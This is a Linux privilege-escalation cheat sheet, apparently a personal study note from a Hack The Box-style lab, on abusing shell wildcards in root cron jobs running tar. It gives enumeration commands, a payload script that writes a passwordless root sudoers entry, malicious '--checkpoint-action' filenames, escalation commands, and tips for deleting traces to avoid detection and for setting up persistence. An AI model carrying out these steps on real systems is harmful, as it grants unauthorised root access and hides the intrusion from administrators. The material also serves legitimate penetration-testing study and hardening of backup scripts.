https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
### 1. Technique Name:

Wildcard Abuse
### 2. Summary:

Wildcard abuse takes advantage of how the shell expands special characters like `*`, `?`, and `[ ]` before executing commands. When a privileged script or cron job uses a wildcard to reference files, it can be manipulated to inject command-line arguments. This can lead to arbitrary command execution with elevated privileges—commonly via programs like `tar`, `rsync`, `find`, or `chmod` that support user-defined options through filename expansion.
### 3. Conditions / Requirements:

- Writable directory where a wildcard (`*`) is used in a privileged command (e.g., cron job, backup script)    
- The vulnerable command (like `tar`) must support malicious argument injection via filenames
- Ability to create files with arbitrary names (including ones starting with `--`)
### 4. Enumeration Steps:
#### A. Check for Cron Jobs with Wildcards:

```bash
cat /etc/crontab
ls /etc/cron.*
```

→ Look for cron jobs that run commands like:

```bash
tar -zcf /backup/backup.tar.gz *
```
#### B. Identify Vulnerable Utilities:

Examples of commands vulnerable to argument injection via wildcards:

- `tar`    
- `rsync`
- `chmod`
- `chown`
- `cp`, `mv`, etc.

Check for any usage of these tools with `*` in scripts owned by root or other privileged users.
### 5. Exploitation Steps:
#### A. Create Payload Script:

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```
#### B. Create Malicious Filenames:

```bash
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh root.sh"
```
#### C. Wait for Cron to Execute:

Let the cron job run (e.g., every minute). The shell expands `*` to include your crafted files:

```bash
cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Which becomes:

```bash
tar -zcf /home/htb-student/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh
```
#### D. Escalate with Sudo:

```bash
sudo -l
sudo su
```
### 6. Post-Exploitation Tips:

- Clean up the malicious filenames and payload script to avoid detection:    

```bash
rm -- --checkpoint*
rm root.sh
```

- Use the sudo access to set up persistent root access if needed
- Rotate through other potential cron job targets or repeat technique if multiple wildcard-based scripts are found
### 7. Example / Notes:

- Example Cron Entry:

```bash
*/1 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

- After Exploitation:

```bash
sudo -l
# User htb-student may run the following commands on NIX02:
# (root) NOPASSWD: ALL
```

- Other Useful Wildcard Patterns:    
    - `?` for single character fuzzing    
    - `[a-z]` for controlled ranges    
    - `~` to refer to user home directories    
- Warning: This technique may not work if the command/script escapes or sanitizes filenames, or if the binary is run with full paths instead of `*`.
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Wildcard_abuse #tar